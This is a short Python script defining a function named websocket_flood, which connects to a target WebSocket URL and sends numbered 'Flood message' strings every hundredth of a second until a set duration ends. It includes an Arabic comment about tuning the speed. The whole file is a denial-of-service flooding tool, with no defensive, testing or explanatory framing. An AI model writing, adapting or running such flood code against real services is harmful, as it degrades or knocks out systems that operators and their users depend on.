import websocket
import threading
import time
import random

def websocket_flood(target_url, duration):
    timeout = time.time() + duration

    def send_messages(ws):
        while time.time() < timeout:
            try:
                msg = f"Flood message {random.randint(1,100000)}"
                ws.send(msg)
                print(f"[WebSocket] Sent: {msg}")
                time.sleep(0.01)  # ضبط السرعة حسب الحاجة
            except Exception as e:
                print(f"[WebSocket] Send error: {e}")
                break

    try:
        ws = websocket.create_connection(target_url)
        print(f"[WebSocket] Connected to {target_url}")
        send_messages(ws)
        ws.close()
    except Exception as e:
        print(f"[WebSocket] Connection error: {e}")
